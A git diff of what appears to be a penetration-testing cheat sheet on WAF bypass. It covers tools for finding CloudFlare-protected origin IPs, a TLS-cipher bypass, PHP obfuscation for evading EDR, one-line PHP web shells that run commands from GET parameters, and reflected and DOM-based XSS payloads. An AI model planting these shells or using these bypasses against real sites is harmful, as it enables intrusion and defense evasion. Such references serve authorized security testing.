@@ -85,26 +85,26 @@ https://www.shodan.io/search?query=example.com
 https://www.iphistory.ch/en/  
 
 -> CloudFlair - Find the origin server IP of websites protected by CloudFlare WAF
-```
-python cloudflair.py myvulnerable.site
+```bash
+python cloudflair.py example.com
 ```
 https://github.com/christophetd/CloudFlair 
 
 -> CrimeFlare - Find the origin server IP of websites protected by CloudFlare WAF
-```
-./crimeflare.php exemple.com
+```bash
+./crimeflare.php example.com
 ```
 https://github.com/zidansec/CloudPeler  
 
 -> CloudFail - Find the origin server IP of websites protected by CloudFlare WAF
-```
-python3 cloudfail.py --target <domain>
+```bash
+python3 cloudfail.py --target example.com
 ```
 https://github.com/m0rtem/CloudFail
 
 -> bypass-firewalls-by-DNS-history.sh
-```
-bash bypass-firewalls-by-DNS-history.sh -d site.com
+```bash
+bash bypass-firewalls-by-DNS-history.sh -d example.com
 ```
 https://github.com/vincentcox/bypass-firewalls-by-DNS-history
 
@@ -115,7 +115,7 @@ https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/
 
 ### Bypass using cipher not supported by WAF
 This bypass consists of finding SSL/TLS ciphers that the WAF cannot decrypt and that the server can decrypt, thus inhibiting the action of the WAF.
-```
+```bash
 python abuse-ssl-bypass-waf.py -thread 4 -target <target>  
 curl --ciphers <cipher> -G <target> -d <payload>
 ```
@@ -146,25 +146,25 @@ https://www.silisoftware.com/tools/ipconverter.php
 Obfuscation techniques in PHP consist of making PHP code less readable/understandable, which can help evade signature-based controls and, in some cases, even be useful for bypassing the detection of malicious files by poorly configured EDR solutions.
 
 ### Mix - Hex + Octal
-```
+```php
 echo "T\x72\x69\143\153s";#Tricks
 ```
 
 ### Variable Parsing
-```
+```php
 $a = "ri"; $b ="ck"; echo "T$a[0]$a[1]$b[0]$b[1]s";#Tricks
 ```
 
 ### Variable Variables
-```
+```php
 $a = "T"; $$a = "ri"; $$$a = "cks"; echo $a.$T.$ri;#Tricks
 ```
 
 ### PHP Non-Alphanumeric 
-```
+```php
 $\_="{"; #XOR char
 ```  
-```
+```php
 echo $\_=($\_^"<").($\_^">").($\_^"/"); #XOR = GET
 ```  
 https://web.archive.org/web/20160516145602/http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/
@@ -186,27 +186,27 @@ Some PHP applications use the direct disable_functions option, which can be used
 ### Functions
 
 -> shell_exec  
-```
+```php
 <?php echo shell_exec($_GET['ok']);?>
 ```
 
 -> system  
-```
+```php
 <?php system($_GET['ok']);?>  
 ```
 
 -> exec  
-```
+```php
 <?php echo exec($_GET['ok']);?>  
 ```
 
 -> scandir  
-```
+```php
 <?php foreach(scandir($_GET['ok']) as $dir){echo "<br>";echo $dir;};?>
 ```
 
 -> file_get_contents  
-```
+```php
 <?php file_get_contents($_GET['ok']);?>
 ```
 
@@ -220,56 +220,98 @@ Some PHP applications use the direct disable_functions option, which can be used
 ```
 5-> Detect if there are filters or blockages and modify as needed to make it work
 
-### Examples
+### Cross-Site Scripting Reflected Examples
+The following are some examples of Reflected XSS, where malicious code is injected through URL parameters or forms and reflected directly in the server response, immediately executing in the browser when the page is loaded.
 #### HTML Tag
-```
+```html
 <div>here</div>
 ```
-->  
-```
+-> payload is injected directly into an HTML tag 
+```html
 <svg/onload=alert(1)
 ```
 
-#### HTML Tag Attributes
-```
+#### HTML  Attributes
+```html
 <input value="here"/></input>
 ```
  
-->  
-```
+-> payload is injected inside HTML attributes
+```js
 " /><script>alert(1)</script>
 ```
   
 #### Script Tag
-```
+```js
 <script>
     var name="here";
 </script>
 ```
   
-->  
-```
+-> payload is injected within a JavaScript code context
+```js
 ";alert(1);//
 ```
 
 #### Event Attributes
-```
+```html
 <button onclick="here;">Okay!</button>
 ```
 
-->  
-```
+-> payload is injected inside attributes like onclick, onmouseover etc.
+```js
 alert(1)
 ```
 
 #### Dom Based
+Below are some examples of DOM-based XSS, where malicious code is dynamically manipulated on the client side via JavaScript, interacting with the DOM (Document Object Model), which represents the structure of the web page.
+##### Injection via location.search and innerHTML
+```js
+<script>var q = location.search.replace("?q=", "");domE1.innerHTML = "<a href=\'"+q+"\'>Click here</a>";</script>
 ```
-<script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
+-> Payload
+```js
+?q=javascript:alert(1)
 ```
-  
-->  
+
+##### Injection via document.write
+```js
+<script>
+  var q = new URLSearchParams(location.search).get("q");
+  document.write("<div>" + q + "</div>");
+</script>
 ```
-javascript:alert(1)
+
+-> Payload
+```js
+?q=<img src=x onerror=alert(1)>
+```
+
+##### Injection via location.hash and innerHTML
+```js
+<script>
+  var hash = location.hash.substring(1);
+  document.getElementById("content").innerHTML = hash;
+</script>
+```
+
+-> Payload
+```js
+#<svg/onload=alert(1)>
+```
+
+#### Injection via setAttribute
+
+```
+<script>
+  var user = location.search.split("=")[1];
+  document.getElementById("link").setAttribute("href", user);
+</script>
+```
+
+-> Payload
+```
+?user=javascript:alert(1)
 ```
 
 ### XSS Protection
@@ -381,7 +423,6 @@ eval(decodeURIComponent(/alert(%22xss%22)/.source))
 - https://checkserp.com/encode/unicode/  
 - http://www.unit-conversion.info/texttools/octal/  
 - http://www.unit-conversion.info/texttools/hexadecimal/  
-
 
 ### JavaScript Encoding
 -> jjencode  
